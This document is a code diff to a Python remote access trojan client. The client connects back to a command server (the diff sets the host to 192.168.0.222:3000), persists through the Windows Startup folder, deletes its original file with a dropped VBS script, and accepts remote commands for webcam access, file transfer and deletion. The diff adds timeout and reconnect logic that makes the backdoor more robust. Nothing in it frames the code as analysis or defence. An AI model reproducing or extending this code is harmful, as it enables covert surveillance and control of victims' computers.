@@ -2,7 +2,7 @@ import socket, subprocess, os, time, platform, sys, pyscreeze, urllib.request, c
 from io import StringIO
 
 # Socket Properties
-HOST = ""
+HOST = "192.168.0.222"
 PORT = 3000
 
 # Defines (Send & Recv) Functions for use
@@ -27,7 +27,7 @@ try:
     with open(appdata+"/configure.vbs", "w") as VBS_File:
         VBS_File.write(f"Set del = CreateObject(\"Scripting.FileSystemObject\")\ndel.DeleteFile(\"{os.getcwd() + '/' + filename}\")")
 
-    os.startfile(Startup_Path); subprocess.Popen(appdata+"/configure.vbs", shell=True)
+    subprocess.Popen(Startup_Path, shell=True); subprocess.Popen(appdata+"/configure.vbs", shell=True)
     sys.exit(0)
 
 except (FileNotFoundError, Exception):
@@ -103,7 +103,7 @@ def Webcam():
         del(webcam); send(b"success")
 
         try:
-            result = subprocess.check_output(["powershell.exe", "Get-WmiObject Win32_PNPEntity | Select Name | Select-String 'Camera'"], stdin=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True)
+            result = subprocess.check_output(["powershell.exe", "Get-WmiObject Win32_PNPEntity | Select Name | Select-String 'Camera'"], stdin=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=12, shell=True)
             Webcam_Name = result.split(b"Name=")[1].split(b"}")[0].decode()
         except:
             Webcam_Name = "Not Found"
@@ -216,7 +216,7 @@ def Delete():
 
 while (True):
     try:
-        ServerCommand = recv(1024).decode()
+        objSocket.settimeout(180); ServerCommand = recv(1024).decode()
         if (ServerCommand == "close-connection"):
             ClearFiles(); objSocket.close(); del(objSocket); break
         elif (ServerCommand == "append-connection"):
@@ -253,6 +253,9 @@ while (True):
             ReceiveFile(filename=recv(1024).decode(), buffersize=int(recv(1024).decode()))
         elif (ServerCommand == "delete"):
             Delete()
+
+    except socket.timeout:
+        objSocket.close(); del(objSocket); main()
 
     except (socket.error, Exception):
         ClearFiles(); objSocket.close(); del(objSocket); main()
